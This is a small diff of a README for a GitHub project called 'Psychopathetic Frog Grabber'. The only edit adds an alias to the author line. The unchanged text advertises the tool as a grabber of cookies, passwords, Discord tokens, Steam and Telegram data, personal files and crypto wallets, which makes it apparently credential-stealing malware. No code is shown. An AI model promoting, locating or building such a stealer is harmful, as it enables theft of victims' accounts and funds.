@@ -3,7 +3,7 @@
 
 ##### 🌍 Discord (Soon) - [💡 Features](https://github.com/ZtczGODDESS/Psycho#features) 
 ### Authors
-- GrimXKD
+- GrimXKD aka Ztcz
 
 # Psychopathetic Frog Grabber (GrimXD#3832)
 The new modern grabber that grabs cookies, passwords, discord tokens, steam files, telegram, interesting files found on pc and hardware crypto wallets etc.
